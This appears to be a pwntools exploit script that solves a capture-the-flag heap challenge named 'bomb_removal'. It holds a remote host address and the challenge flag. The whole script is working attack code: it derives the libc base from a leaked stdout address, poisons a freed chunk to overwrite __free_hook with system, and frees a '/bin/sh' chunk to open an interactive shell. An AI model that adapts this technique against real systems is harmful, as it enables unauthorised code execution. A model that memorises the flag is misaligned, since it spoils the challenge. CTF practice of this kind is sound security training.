from pwn import *


if args.REMOTE:
    p = remote('34.64.33.48', 30001)
else:
    p = process('./bomb_removal')

if args.GDB:
    gdb.attach(p, api=True)

libc = ELF("./libc6_2.27-3ubuntu1.6_amd64.so")


def add_bomb(data):
    p.sendlineafter(b">> ", b"1")
    p.sendafter(b"name: ", data)


def free():
    p.sendlineafter(b">> ", b"2")


def print_bomb():
    p.sendlineafter(b">> ", b"3")
    p.recvuntil(b"Bomb name: ")
    return p.recvline().strip()


def modify_bomb(data):
    p.sendlineafter(b">> ", b"4")
    p.sendafter(b"name: ", data)


p.recvuntil(b"stdout: ")
stdout = int(p.recvline().strip(), 16)
log.info("stdout: " + hex(stdout))

libc.address = stdout - libc.sym['_IO_2_1_stdout_']
log.info("Libc: " + hex(libc.address))
free()
modify_bomb(p64(libc.sym["__free_hook"]))
one = libc.sym["system"]
add_bomb(b"/bin/sh\x00")
add_bomb(p64(one))
add_bomb(b"/bin/sh\x00")
free()
# leak = u64(print_bomb()[0:8].ljust(8, b"\x00"))
# p.sendlineafter(b">> ", b"3")

p.interactive()

# ESCAPE{9597_194ff_a251ccd9_b7557366cfa_7a52fa7_2abb2}